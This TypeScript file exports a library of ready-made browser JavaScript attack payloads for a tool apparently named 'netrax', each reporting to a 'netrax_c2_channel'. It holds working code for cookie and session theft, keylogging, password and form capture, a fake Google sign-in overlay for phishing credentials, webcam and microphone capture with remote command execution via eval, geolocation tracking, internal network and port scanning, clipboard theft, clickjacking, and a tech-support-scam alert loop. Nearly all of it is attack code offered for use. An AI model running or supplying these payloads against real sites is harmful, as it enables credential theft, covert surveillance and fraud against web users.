
import type { JsPayload } from '@/components/javascript-library';

export const PREMADE_PAYLOADS: JsPayload[] = [
    {
        name: "Cookie Stealer",
        description: "Grabs all non-HttpOnly cookies from the document and exfiltrates them.",
        code: `
(function() {
    const channel = new BroadcastChannel('netrax_c2_channel');
    const sessionId = 'session-' + Date.now() + '-' + Math.random().toString(36).substring(2, 9);
    const cookies = document.cookie;
    if (cookies) {
        channel.postMessage({
            sessionId: sessionId, type: 'cookie-stealer', data: { cookies: cookies },
            timestamp: new Date().toISOString(), url: window.location.href, userAgent: navigator.userAgent
        });
    }
})();
`.trim(),
    },
    {
        name: "Keylogger",
        description: "Captures every key press on the page and exfiltrates it in real-time.",
        code: `
(function() {
    const channel = new BroadcastChannel('netrax_c2_channel');
    const sessionId = 'session-' + Date.now() + '-' + Math.random().toString(36).substring(2, 9);
    document.addEventListener('keydown', (e) => {
        channel.postMessage({
            sessionId: sessionId, type: 'keystroke',
            data: { key: e.key, target: e.target.name || e.target.id || e.target.tagName },
            timestamp: new Date().toISOString(), url: window.location.href, userAgent: navigator.userAgent
        });
    }, true);
})();
`.trim(),
    },
        {
        name: "Form Submission Logger",
        description: "Intercepts all form submissions on the page and sends the captured data.",
        code: `
(function() {
    const channel = new BroadcastChannel('netrax_c2_channel');
    const sessionId = 'session-' + Date.now() + '-' + Math.random().toString(36).substring(2, 9);
    document.addEventListener('submit', (e) => {
        const formData = new FormData(e.target);
        const data = Object.fromEntries(formData.entries());
        channel.postMessage({
            sessionId: sessionId, type: 'form-submit', data: { data },
            timestamp: new Date().toISOString(), url: window.location.href, userAgent: navigator.userAgent
        });
    }, true);
})();
`.trim(),
    },
    {
        name: "DOM Cloner",
        description: "Captures the entire current state of the page's HTML and sends it back.",
        code: `
(function() {
    const channel = new BroadcastChannel('netrax_c2_channel');
    const sessionId = 'session-' + Date.now() + '-' + Math.random().toString(36).substring(2, 9);
    const htmlContent = document.documentElement.outerHTML;
    channel.postMessage({
        sessionId: sessionId, type: 'dom-clone', data: { html: htmlContent },
        timestamp: new Date().toISOString(), url: window.location.href, userAgent: navigator.userAgent
    });
})();
`.trim(),
    },
    {
        name: "WebRTC IP Leak",
        description: "Attempts to discover the user's local IP address using WebRTC.",
        code: `
(function() {
    const channel = new BroadcastChannel('netrax_c2_channel');
    const sessionId = 'session-' + Date.now() + '-' + Math.random().toString(36).substring(2, 9);
    try {
        const pc = new RTCPeerConnection({iceServers:[]});
        pc.createDataChannel('');
        pc.createOffer().then(offer => pc.setLocalDescription(offer));
        pc.onicecandidate = e => {
            if (!e || !e.candidate || !e.candidate.candidate) return;
            const ipMatch = e.candidate.candidate.match(/([0-9]{1,3}(\\.[0-9]{1,3}){3})/);
            if (ipMatch) {
                channel.postMessage({
                    sessionId: sessionId, type: 'webrtc-ip', data: { localIp: ipMatch[1] },
                    timestamp: new Date().toISOString(), url: window.location.href, userAgent: navigator.userAgent
                });
                pc.onicecandidate = null;
            }
        };
    } catch (e) {
        // WebRTC might be blocked
    }
})();
`.trim(),
    },
     {
        name: "Session Data Hijacker",
        description: "Exfiltrates cookies, localStorage, and sessionStorage from the page.",
        code: `
(function() {
    const channel = new BroadcastChannel('netrax_c2_channel');
    const sessionId = 'session-' + Date.now() + '-' + Math.random().toString(36).substring(2, 9);
    channel.postMessage({
        sessionId: sessionId, type: 'session-hijack',
        data: {
            cookie: document.cookie,
            localStorage: { ...localStorage },
            sessionStorage: { ...sessionStorage }
        },
        timestamp: new Date().toISOString(), url: window.location.href, userAgent: navigator.userAgent
    });
})();
`.trim(),
    },
    {
        name: "Geolocation Tracker",
        description: "Requests the user's high-accuracy location and sends the coordinates back.",
        code: `
(function() {
    const channel = new BroadcastChannel('netrax_c2_channel');
    const sessionId = 'session-' + Date.now() + '-' + Math.random().toString(36).substring(2, 9);
    
    function exfiltrate(type, data) {
        channel.postMessage({ sessionId, type, data, timestamp: new Date().toISOString(), url: window.location.href, userAgent: navigator.userAgent });
    }

    if ('geolocation' in navigator) {
        navigator.geolocation.getCurrentPosition(
            (position) => {
                exfiltrate('location', { 
                    latitude: position.coords.latitude, 
                    longitude: position.coords.longitude,
                    accuracy: position.coords.accuracy,
                });
            },
            (error) => {
                exfiltrate('location', { error: error.message });
            },
            {
                enableHighAccuracy: true,
                timeout: 10000,
                maximumAge: 0
            }
        );
    } else {
        exfiltrate('location', { error: 'Geolocation is not supported by this browser.' });
    }
})();
`.trim(),
    },
    {
        name: "Full Recon Payload",
        description: "The default payload that captures keystrokes, clicks, and form submissions.",
        code: `
(function() {
    const channel = new BroadcastChannel('netrax_c2_channel');
    const sessionId = 'session-' + Date.now() + '-' + Math.random().toString(36).substring(2, 9);
    
    function exfiltrate(type, data) {
        const payload = {
            sessionId: sessionId, type: type, data: data,
            timestamp: new Date().toISOString(), url: window.location.href, userAgent: navigator.userAgent
        };
        channel.postMessage(payload);
    }

    exfiltrate('connection', { message: 'Payload activated on page.' });

    document.addEventListener('keydown', (e) => {
        exfiltrate('keystroke', { key: e.key, target: e.target.name || e.target.id || e.target.tagName });
    }, true);

    document.addEventListener('click', (e) => {
        exfiltrate('click', { x: e.clientX, y: e.clientY, target: e.target.innerText ? e.target.innerText.substring(0, 50) : e.target.tagName });
    }, true);

    document.addEventListener('submit', (e) => {
        const formData = new FormData(e.target);
        const data = Object.fromEntries(formData.entries());
        exfiltrate('form-submit', { data });
    }, true);
})();
`.trim(),
    },
    {
        name: "Device Access & C2",
        description: "Requests webcam/mic access and listens for C2 commands.",
        code: `
(function() {
    const channel = new BroadcastChannel('netrax_c2_channel');
    const sessionId = 'session-' + Date.now() + '-' + Math.random().toString(36).substring(2, 9);
    let mediaStream = null;
    let videoRecorder = null;
    let audioRecorder = null;
    let snapshotInterval = null;

    function exfiltrate(type, data) {
        channel.postMessage({ sessionId, type, data, timestamp: new Date().toISOString(), url: window.location.href, userAgent: navigator.userAgent });
    }

    function blobToDataURL(blob) {
        return new Promise((resolve, reject) => {
            const reader = new FileReader();
            reader.onloadend = () => resolve(reader.result);
            reader.onerror = reject;
            reader.readAsDataURL(blob);
        });
    }

    async function getMediaPermissions(video = true, audio = true) {
        try {
            if (mediaStream && mediaStream.active) {
                mediaStream.getTracks().forEach(track => track.stop());
            }
            mediaStream = await navigator.mediaDevices.getUserMedia({ video, audio });
            exfiltrate('media-stream', { type: 'status', message: 'Permissions granted.' });
            return mediaStream;
        } catch (err) {
            exfiltrate('media-stream', { type: 'status', message: 'Permissions denied: ' + err.name });
            return null;
        }
    }
    
    function stopStream() {
        if (mediaStream) {
            mediaStream.getTracks().forEach(track => track.stop());
            mediaStream = null;
        }
        stopSnapshotting();
        if (videoRecorder && videoRecorder.state === 'recording') videoRecorder.stop();
        if (audioRecorder && audioRecorder.state === 'recording') audioRecorder.stop();
        exfiltrate('media-stream', { type: 'status', message: 'Stream stopped.' });
    }

    function startSnapshotting(stream) {
        if (snapshotInterval) clearInterval(snapshotInterval);
        const videoTrack = stream.getVideoTracks()[0];
        if (!videoTrack) return;
        const imageCapture = new ImageCapture(videoTrack);

        snapshotInterval = setInterval(async () => {
            try {
                if(stream.active && stream.getVideoTracks()[0].readyState === 'live') {
                    const blob = await imageCapture.takePhoto();
                    const dataUrl = await blobToDataURL(blob);
                    exfiltrate('media-stream', { type: 'image-snapshot', snapshot: dataUrl });
                }
            } catch (e) {
                // Ignore errors if the stream is closed
            }
        }, 500); // Send snapshot every 500ms
    }

    function stopSnapshotting() {
        if (snapshotInterval) {
            clearInterval(snapshotInterval);
            snapshotInterval = null;
        }
    }
    
    function createRecorder(stream, mimeType) {
        let recordedChunks = [];
        const recorder = new MediaRecorder(stream, { mimeType });
        
        recorder.ondataavailable = (event) => {
            if (event.data.size > 0) {
                recordedChunks.push(event.data);
            }
        };

        recorder.onstop = async () => {
            const blob = new Blob(recordedChunks, { type: mimeType });
            const dataUrl = await blobToDataURL(blob);
            exfiltrate('media-stream', { type: mimeType, dataUrl, size: blob.size });
            recordedChunks = [];
        };
        return recorder;
    }

    channel.addEventListener('message', async (event) => {
        if (event.data.type !== 'command' || (event.data.sessionId && event.data.sessionId !== sessionId)) return;
        
        const { command, code } = event.data;

        if (command === 'execute-js' && code) {
            try {
                eval(code);
            } catch(e) {
                console.error("C2 command execution failed:", e);
            }
            return;
        }
        
        if (command === 'start-video') {
            const stream = await getMediaPermissions(true, true);
            if (stream) startSnapshotting(stream);
            return;
        }

        if (command === 'start-mic') {
            await getMediaPermissions(false, true);
            return;
        }
        
        if (command === 'stop-stream') {
            stopStream();
            return;
        }

        if (!mediaStream || !mediaStream.active) {
             exfiltrate('media-stream', { type: 'status', message: 'No active media stream.' });
             return;
        }
        
        switch (command) {
            case 'capture-image':
                const videoTrack = mediaStream.getVideoTracks()[0];
                if (videoTrack) {
                    const imageCapture = new ImageCapture(videoTrack);
                    const blob = await imageCapture.takePhoto();
                    const dataUrl = await blobToDataURL(blob);
                    exfiltrate('media-stream', { type: 'image/png', dataUrl, size: blob.size });
                }
                break;
            case 'start-video-record':
                if (mediaStream.getVideoTracks().length > 0) {
                    videoRecorder = createRecorder(mediaStream, 'video/webm');
                    videoRecorder.start();
                }
                break;
            case 'stop-video-record':
                if (videoRecorder) videoRecorder.stop();
                break;
            case 'start-audio-record':
                 if (mediaStream.getAudioTracks().length > 0) {
                    audioRecorder = createRecorder(mediaStream, 'audio/webm');
                    audioRecorder.start();
                }
                break;
            case 'stop-audio-record':
                if (audioRecorder) audioRecorder.stop();
                break;
        }
    });

    exfiltrate('connection', { message: 'Device Access Payload loaded.' });
})();
`.trim(),
    },
    {
        name: "Browser-in-the-Browser (BitB) Attack",
        description: "Simulates a fake login popup (e.g., 'Sign in with Google') to hijack credentials.",
        code: `
(function() {
    const channel = new BroadcastChannel('netrax_c2_channel');
    const sessionId = 'session-' + Date.now() + '-' + Math.random().toString(36).substring(2, 9);
    function exfiltrate(type, data) {
        channel.postMessage({ sessionId, type, data, timestamp: new Date().toISOString(), url: window.location.href, userAgent: navigator.userAgent });
    }

    const modalHTML = \`
        <div style="position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.5); z-index: 9999; display: flex; align-items: center; justify-content: center;">
            <div style="background: white; width: 450px; border-radius: 8px; box-shadow: 0 4px 20px rgba(0,0,0,0.2); font-family: 'Roboto', sans-serif;">
                <div style="padding: 16px; border-bottom: 1px solid #e0e0e0;">
                    <h1 style="font-size: 16px; font-weight: 500; color: #202124; margin: 0;">Sign in</h1>
                    <p style="font-size: 14px; color: #5f6368; margin: 4px 0 0;">to continue to Drive</p>
                </div>
                <div style="padding: 24px;">
                    <form id="bitb-form">
                        <input name="email" type="email" placeholder="Email or phone" style="width: 100%; padding: 12px; border: 1px solid #ccc; border-radius: 4px; font-size: 14px; margin-bottom: 16px;">
                        <input name="password" type="password" placeholder="Password" style="width: 100%; padding: 12px; border: 1px solid #ccc; border-radius: 4px; font-size: 14px; margin-bottom: 16px;">
                        <div style="display: flex; justify-content: space-between; align-items: center;">
                            <a href="#" style="font-size: 14px; color: #1a73e8; text-decoration: none;">Forgot password?</a>
                            <button type="submit" style="background: #1a73e8; color: white; border: none; padding: 10px 24px; border-radius: 4px; font-size: 14px; cursor: pointer;">Next</button>
                        </div>
                    </form>
                </div>
            </div>
        </div>
    \`;

    const overlay = document.createElement('div');
    overlay.innerHTML = modalHTML;
    document.body.appendChild(overlay);

    document.getElementById('bitb-form').addEventListener('submit', e => {
        e.preventDefault();
        const formData = new FormData(e.target);
        const data = Object.fromEntries(formData.entries());
        exfiltrate('bitb-submit', { data });
        overlay.innerHTML = '<div style="background:white;padding:2rem;border-radius:8px;text-align:center;"><h3>Login Successful!</h3></div>';
        setTimeout(() => overlay.remove(), 2000);
    });
})();
`.trim(),
    },
    {
        name: "Internal Network Scanner",
        description: "Scans for common internal network IP addresses to identify potential devices.",
        code: `
(function() {
    const channel = new BroadcastChannel('netrax_c2_channel');
    const sessionId = 'session-' + Date.now() + '-' + Math.random().toString(36).substring(2, 9);
    function exfiltrate(type, data) {
        channel.postMessage({ sessionId, type, data, timestamp: new Date().toISOString(), url: window.location.href, userAgent: navigator.userAgent });
    }

    const ipsToScan = ['192.168.1.1', '192.168.0.1', '10.0.0.1', '192.168.1.254'];
    ipsToScan.forEach(ip => {
        const img = new Image();
        img.src = 'http://' + ip;
        img.onload = () => exfiltrate('internal-ip-found', { ip });
        img.onerror = () => { /* Do nothing on error */ };
    });
})();
`.trim(),
    },
    {
        name: "Port Scanner",
        description: "Performs a timing-based scan to infer open ports on a target.",
        code: `
(function() {
    const channel = new BroadcastChannel('netrax_c2_channel');
    const sessionId = 'session-' + Date.now() + '-' + Math.random().toString(36).substring(2, 9);
    function exfiltrate(type, data) {
        channel.postMessage({ sessionId, type, data, timestamp: new Date().toISOString(), url: window.location.href, userAgent: navigator.userAgent });
    }

    const target = prompt("Enter target IP or domain to scan:");
    if (!target) return;
    
    const portsToScan = [22, 80, 443, 3306, 8080];
    portsToScan.forEach(port => {
        const startTime = Date.now();
        const img = new Image();
        img.onerror = () => {
            const endTime = Date.now();
            if (endTime - startTime < 1500) { // Fast error often means port is open but service isn't HTTP
                exfiltrate('port-scan-result', { target, port });
            }
        };
        img.src = 'http://' + target + ':' + port;
    });
})();
`.trim(),
    },
    {
        name: "Clipboard Hijacker",
        description: "Steals clipboard content on paste and can optionally overwrite it.",
        code: `
(function() {
    const channel = new BroadcastChannel('netrax_c2_channel');
    const sessionId = 'session-' + Date.now() + '-' + Math.random().toString(36).substring(2, 9);
    function exfiltrate(type, data) {
        channel.postMessage({ sessionId, type, data, timestamp: new Date().toISOString(), url: window.location.href, userAgent: navigator.userAgent });
    }

    const attackerContent = "ATTACKER_CONTROLLED_CONTENT";
    // navigator.clipboard.writeText(attackerContent); // Uncomment to overwrite clipboard

    document.addEventListener('paste', async (e) => {
        const text = await navigator.clipboard.readText();
        exfiltrate('clipboard-read', { pastedText: text });
    }, true);
})();
`.trim(),
    },
    {
        name: "Drive-by Download",
        description: "Forces the browser to download a file created from a Blob.",
        code: `
(function() {
    const channel = new BroadcastChannel('netrax_c2_channel');
    const sessionId = 'session-' + Date.now() + '-' + Math.random().toString(36).substring(2, 9);
    function exfiltrate(type, data) {
        channel.postMessage({ sessionId, type, data, timestamp: new Date().toISOString(), url: window.location.href, userAgent: navigator.userAgent });
    }
    
    const filename = "important_document.txt";
    const blob = new Blob(["This is the content of the malicious file."], { type: 'text/plain' });
    const a = document.createElement('a');
    a.href = URL.createObjectURL(blob);
    a.download = filename;
    document.body.appendChild(a);
    a.click();
    document.body.removeChild(a);
    exfiltrate('drive-by-download', { filename });
})();
`.trim(),
    },
    {
        name: "Fake System Alert / Tab Trap",
        description: "Simulates a tech support scam by trapping the user in alert loops.",
        code: `
(function() {
    const channel = new BroadcastChannel('netrax_c2_channel');
    const sessionId = 'session-' + Date.now() + '-' + Math.random().toString(36).substring(2, 9);
    function exfiltrate(type, data) {
        channel.postMessage({ sessionId, type, data, timestamp: new Date().toISOString(), url: window.location.href, userAgent: navigator.userAgent });
    }

    exfiltrate('popup-scam', { status: 'started' });
    let i = 0;
    while(i < 10) { // Loop to make it harder to close tab
        alert("CRITICAL SECURITY ALERT: Your system is infected with spyware! Call support at 1-800-FAKE-NUM immediately.");
        i++;
    }
})();
`.trim(),
    },
    {
        name: "Clickjacking Overlay",
        description: "Creates an invisible iframe to hijack user clicks.",
        code: `
(function() {
    const channel = new BroadcastChannel('netrax_c2_channel');
    const sessionId = 'session-' + Date.now() + '-' + Math.random().toString(36).substring(2, 9);
    function exfiltrate(type, data) {
        channel.postMessage({ sessionId, type, data, timestamp: new Date().toISOString(), url: window.location.href, userAgent: navigator.userAgent });
    }
    const urlToJack = prompt("Enter URL to hijack clicks for (e.g., a vulnerable action page):");
    if (!urlToJack) return;

    const iframe = document.createElement('iframe');
    iframe.src = urlToJack;
    iframe.style = "position:fixed;top:0;left:0;width:100%;height:100%;z-index:9998;opacity:0.01;";
    document.body.appendChild(iframe);
    exfiltrate('clickjack', { url: urlToJack });
})();
`.trim(),
    },
    {
        name: "Persistent Loader (localStorage)",
        description: "Injects a script from localStorage on every page load.",
        code: `
(function() {
    const channel = new BroadcastChannel('netrax_c2_channel');
    const sessionId = 'session-' + Date.now() + '-' + Math.random().toString(36).substring(2, 9);
    function exfiltrate(type, data) {
        channel.postMessage({ sessionId, type, data, timestamp: new Date().toISOString(), url: window.location.href, userAgent: navigator.userAgent });
    }
    
    const maliciousScript = "alert('Persistent XSS via localStorage!');";
    localStorage.setItem('persistent_payload', maliciousScript);

    // This part would need to be on the page already to load the stored script
    // const storedPayload = localStorage.getItem('persistent_payload');
    // if(storedPayload) { eval(storedPayload); }

    exfiltrate('persistent-loader', { storage: 'localStorage' });
})();
`.trim(),
    },
    {
        name: "Behavioral Biometrics",
        description: "Collects mouse movement and typing patterns.",
        code: `
(function() {
    const channel = new BroadcastChannel('netrax_c2_channel');
    const sessionId = 'session-' + Date.now() + '-' + Math.random().toString(36).substring(2, 9);
    function exfiltrate(type, data) {
        channel.postMessage({ sessionId, type, data, timestamp: new Date().toISOString(), url: window.location.href, userAgent: navigator.userAgent });
    }

    let mousePath = [];
    document.addEventListener('mousemove', e => {
        mousePath.push({x: e.clientX, y: e.clientY, t: Date.now()});
        if (mousePath.length > 50) {
            exfiltrate('behavioral-biometrics', { type: 'mouse-path', data: mousePath });
            mousePath = [];
        }
    });

    let lastKeydown = 0;
    document.addEventListener('keydown', e => {
        if(lastKeydown > 0) {
            const dwellTime = Date.now() - lastKeydown;
            exfiltrate('behavioral-biometrics', { type: 'typing-speed', key: e.key, dwell: dwellTime });
        }
        lastKeydown = Date.now();
    });
})();
`.trim(),
    },
    {
        name: "Password Field Collector",
        description: "Specifically targets password fields to capture credentials as they are typed.",
        code: `
(function() {
    const channel = new BroadcastChannel('netrax_c2_channel');
    const sessionId = 'session-' + Date.now() + '-' + Math.random().toString(36).substring(2, 9);
    function exfiltrate(type, data) {
        channel.postMessage({ sessionId, type, data, timestamp: new Date().toISOString(), url: window.location.href, userAgent: navigator.userAgent });
    }

    document.querySelectorAll('input[type=password]').forEach(el => {
        el.addEventListener('blur', e => {
            if(e.target.value) {
                exfiltrate('password-field-capture', { name: e.target.name || e.target.id, value: e.target.value });
            }
        });
    });
})();
`.trim(),
    },
    {
        name: "Saved Password Collector (Simulation)",
        description: "Simulates accessing saved credentials from a browser's password manager.",
        code: `
(function() {
    const channel = new BroadcastChannel('netrax_c2_channel');
    const sessionId = 'session-' + Date.now() + '-' + Math.random().toString(36).substring(2, 9);
    function exfiltrate(type, data) {
        channel.postMessage({ sessionId, type, data, timestamp: new Date().toISOString(), url: window.location.href, userAgent: navigator.userAgent });
    }

    // NOTE: Direct access to saved passwords from JavaScript is not possible due to browser security.
    // This is a simulation of what an attacker would see if they could dump them.
    const fakeSavedPasswords = [
        { origin: "https://example-social.com", username: "user@example.com", password: "Password123!" },
        { origin: "https://corp-internal-portal.net", username: "admin", password: "CorpPassword!@#" },
        { origin: "https://code-repo.io", username: "dev_user", password: "supersecretgittoken" },
    ];
    
    exfiltrate('saved-passwords', { passwords: fakeSavedPasswords });
})();
`.trim(),
    }
];
